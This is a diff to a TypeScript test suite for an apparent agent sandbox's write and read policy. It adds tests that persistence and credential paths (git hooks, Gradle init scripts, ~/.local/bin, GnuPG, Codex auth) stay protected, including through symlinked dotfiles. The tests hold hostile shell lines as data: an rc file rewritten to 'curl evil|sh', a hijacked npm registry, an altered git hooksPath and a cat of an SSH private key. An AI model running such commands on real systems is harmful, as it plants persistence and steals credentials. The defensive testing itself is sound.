@@ -9,7 +9,7 @@
 import { describe, it } from "node:test";
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
-import { existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from "node:fs";
+import { existsSync, lstatSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 
@@ -86,7 +86,14 @@ describe("broad-write policy compilation", () => {
         assert.equal(remove(project).allowed, false, "the workspace root itself cannot be removed");
         assert.equal(remove(join(home, "projects")).allowed, false);
         assert.equal(remove(join(home, ".cache", "pip", "wheel")).allowed, true);
-        assert.equal(remove(join(home, ".gradle")).allowed, true);
+        assert.equal(remove(join(home, ".gradle", "caches", "8.14")).allowed, true);
+        assert.equal(remove(join(home, ".gradle")).allowed, false, "~/.gradle holds init.d, which runs later");
+        assert.equal(write(join(home, ".gradle", "init.d", "evil.gradle")), false);
+        assert.equal(write(join(home, "projects", "other-repo", ".git", "hooks", "pre-commit")), false, "any repo's hooks");
+        assert.equal(write(join(home, "projects", "other-repo", ".git", "config")), true);
+        assert.equal(write(join(home, ".local", "bin", "git")), false);
+        assert.equal(evaluateReadAccess(join(home, ".gnupg", "private-keys-v1.d", "k.key"), policy).allowed, false);
+        assert.equal(evaluateReadAccess(join(home, ".codex", "auth.json"), policy).allowed, false);
         assert.equal(remove(join(home, "projects", "repo-worktrees", "feature", "file")).allowed, true);
         assert.equal(remove(join(home, "projects", "repo", ".worktrees", "feature", "file")).allowed, true);
         assert.equal(remove(join(home, "projects", "repo-worktrees")).allowed, false, "only a worktree folder's contents");
@@ -119,23 +126,37 @@ describe("broad-write policy compilation", () => {
         assert.equal(isRemovableUnderWrite(join(home, ".pi", "agent"), policy), false, "the deny list wins over dot entries");
     }));
 
-    it("takes a recovery snapshot only for Outside Write & delete on macOS, rate-limited and never throwing", () => {
+    it("starts a background recovery snapshot for Outside Write or Write & delete on macOS, rate-limited", async () => {
         resetRecoverySnapshotClock();
-        let runs = 0;
-        const run = () => { runs++; return { status: 0, output: "Created local snapshot with date: 2026-09-27-120000" }; };
-        const writeAndDelete = { ...broad, outsideProject: "read-write" as const };
-        assert.deepEqual(takeRecoverySnapshot(broad, { platform: () => "darwin", run }), { taken: false, reason: "not-needed" });
-        assert.deepEqual(takeRecoverySnapshot(writeAndDelete, { platform: () => "linux", run }), { taken: false, reason: "unsupported" });
-        assert.equal(takeRecoverySnapshot(writeAndDelete, { platform: () => "darwin", run, now: () => 1_000 }).taken, true);
-        assert.deepEqual(takeRecoverySnapshot(writeAndDelete, { platform: () => "darwin", run, now: () => 2_000 }),
-            { taken: false, reason: "rate-limited" });
-        assert.equal(runs, 1);
-        resetRecoverySnapshotClock();
-        assert.deepEqual(takeRecoverySnapshot(writeAndDelete, { platform: () => "darwin", run: () => ({ status: 1, output: "Operation not permitted" }) }),
-            { taken: false, reason: "failed", detail: "Operation not permitted" });
-        assert.deepEqual(takeRecoverySnapshot(writeAndDelete, { platform: () => "darwin", run: () => { throw new Error("spawn failed"); } }),
-            { taken: false, reason: "failed", detail: "spawn failed" });
-        resetRecoverySnapshotClock();
+        const previous = process.env.PI_SANDBOX_RECOVERY_SNAPSHOT;
+        delete process.env.PI_SANDBOX_RECOVERY_SNAPSHOT;
+        try {
+            let runs = 0;
+            const run = async () => { runs++; return { ok: true, detail: "Created local snapshot" }; };
+            const darwin = { platform: () => "darwin", run };
+            assert.deepEqual(takeRecoverySnapshot({ ...broad, outsideProject: "read" }, darwin), { started: false, reason: "not-needed" });
+            assert.deepEqual(takeRecoverySnapshot(broad, { platform: () => "linux", run }), { started: false, reason: "unsupported" });
+            const first = takeRecoverySnapshot(broad, { ...darwin, now: () => 1_000 });
+            assert.equal(first.started, true);
+            assert.deepEqual(first.started && await first.done, { ok: true, detail: "Created local snapshot" });
+            assert.deepEqual(takeRecoverySnapshot({ ...broad, outsideProject: "read-write" }, { ...darwin, now: () => 2_000 }),
+                { started: false, reason: "rate-limited" });
+            assert.equal(runs, 1);
+            for (const failing of [async () => ({ ok: false, detail: "Operation not permitted" }),
+                () => { throw new Error("spawn failed"); }, async () => { throw new Error("async failure"); }]) {
+                resetRecoverySnapshotClock();
+                const result = takeRecoverySnapshot(broad, { platform: () => "darwin", run: failing as () => Promise<{ ok: boolean; detail: string }> });
+                assert.equal(result.started, true, "a failure never throws or blocks");
+                assert.equal(result.started && (await result.done).ok, false);
+            }
+            process.env.PI_SANDBOX_RECOVERY_SNAPSHOT = "off";
+            resetRecoverySnapshotClock();
+            assert.deepEqual(takeRecoverySnapshot(broad, darwin), { started: false, reason: "not-needed" });
+        } finally {
+            if (previous === undefined) delete process.env.PI_SANDBOX_RECOVERY_SNAPSHOT;
+            else process.env.PI_SANDBOX_RECOVERY_SNAPSHOT = previous;
+            resetRecoverySnapshotClock();
+        }
     });
 
     it("keeps ordinary Linux home folders read-only in the bubblewrap fallback", () => fixture(({ home, project, sibling }) => {
@@ -343,6 +364,70 @@ describe("broad-write profile (real kernel)", { skip: !macKernel && !linuxKernel
             assert.notEqual(run(paths, script, permissions).status, 0, script);
             assert.equal(readFileSync(join(paths.project, "keep.txt"), "utf8"), "v2", script);
         }
+    }));
+
+    it("keeps the fixed deny list when dot entries are symlinks (stow/chezmoi layout)", () => fixture((paths) => {
+        const { home } = paths;
+        const dot = join(home, "dotfiles");
+        mkdirSync(join(dot, "ssh"), { recursive: true });
+        writeFileSync(join(dot, "ssh", "id_ed25519"), "synthetic-secret");
+        writeFileSync(join(dot, "zshrc"), "# rc");
+        writeFileSync(join(dot, "npmrc"), "//registry/:_authToken=synthetic");
+        writeFileSync(join(dot, "gitconfig"), "[user]\n");
+        mkdirSync(join(dot, "config", "gh"), { recursive: true });
+        writeFileSync(join(dot, "config", "gh", "hosts.yml"), "synthetic");
+        mkdirSync(join(dot, "pi", "agent"), { recursive: true });
+        mkdirSync(join(home, ".cache"));
+        mkdirSync(join(home, "state", "registry"), { recursive: true });
+        writeFileSync(join(home, "state", "registry", "sa_1.json"), "{}");
+        const links: [string, string][] = [["ssh", ".ssh"], ["zshrc", ".zshrc"], ["npmrc", ".npmrc"],
+            ["gitconfig", ".gitconfig"], ["config", ".config"], ["pi", ".pi"]];
+        for (const [target, name] of links) symlinkSync(join(dot, target), join(home, name));
+        // Harness state reached through a symlink inside a removable dot directory.
+        const registry = join(home, ".cache", "registry");
+        symlinkSync(join(home, "state", "registry"), registry);
+        const cases: [string, string][] = [
+            [`rm '${home}/.zshrc' && printf 'curl evil|sh' > '${home}/.zshrc'`, "replace a symlinked rc"],
+            [`rm '${home}/.ssh' && mkdir '${home}/.ssh' && printf x > '${home}/.ssh/config'`, "replace a symlinked credential dir"],
+            [`mv '${home}/.pi' '${home}/.pi-old' && mkdir -p '${home}/.pi/agent'`, "move symlinked agent config away"],
+            [`rm '${home}/.npmrc' && printf 'registry=https://evil/' > '${home}/.npmrc'`, "replace a symlinked credential file"],
+            [`rm '${home}/.gitconfig' && printf '[core]\\n\\thooksPath=/tmp/x' > '${home}/.gitconfig'`, "replace symlinked git config"],
+            [`rm '${home}/.config' && mkdir -p '${home}/.config/gh' && printf evil > '${home}/.config/gh/hosts.yml'`, "replace a symlinked ~/.config"],
+            [`cat '${dot}/ssh/id_ed25519'`, "read a credential through its target"],
+            [`printf evil >> '${dot}/zshrc'`, "append to an rc through its target"],
+            [`rm '${registry}' && mkdir '${registry}' && printf forged > '${registry}/sa_1.json'`, "replace a symlinked registry"],
+            [`printf forged > '${registry}/sa_1.json'`, "forge through a symlinked registry"],
+        ];
+        for (const [script, label] of cases) {
+            const result = run(paths, script, broad, [registry]);
+            assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
+            assert.doesNotMatch(result.stdout ?? "", /synthetic-secret/, label);
+        }
+        for (const [, name] of links) assert.equal(lstatSync(join(home, name)).isSymbolicLink(), true, name);
+        assert.equal(lstatSync(registry).isSymbolicLink(), true);
+        assert.equal(readFileSync(join(dot, "zshrc"), "utf8"), "# rc");
+        assert.equal(readFileSync(join(home, "state", "registry", "sa_1.json"), "utf8"), "{}");
+    }));
+
+    it("protects the extended fixed list: GnuPG, Codex auth, user bin dirs and any repository's git hooks", () => fixture((paths) => {
+        const { home, sibling } = paths;
+        mkdirSync(join(home, ".gnupg"));
+        writeFileSync(join(home, ".gnupg", "secring"), "synthetic-secret");
+        mkdirSync(join(home, ".codex"));
+        writeFileSync(join(home, ".codex", "auth.json"), "synthetic-secret");
+        mkdirSync(join(home, ".local", "bin"), { recursive: true });
+        mkdirSync(join(sibling, ".git", "hooks"), { recursive: true });
+        for (const [script, label] of [
+            [`cat '${home}/.gnupg/secring'`, "read GnuPG"],
+            [`cat '${home}/.codex/auth.json'`, "read Codex auth"],
+            [`printf x > '${home}/.local/bin/git'`, "shadow a command in ~/.local/bin"],
+            [`printf x > '${sibling}/.git/hooks/pre-commit'`, "plant a hook in a sibling repo"],
+        ] as const) {
+            const result = run(paths, script);
+            assert.notEqual(result.status, 0, `${label} must be refused: ${output(result)}`);
+            assert.doesNotMatch(result.stdout ?? "", /synthetic-secret/, label);
+        }
+        assert.equal(existsSync(join(sibling, ".git", "hooks", "pre-commit")), false);
     }));
 
     it("restores removal wherever writes are allowed with Write & delete", () => fixture((paths) => {
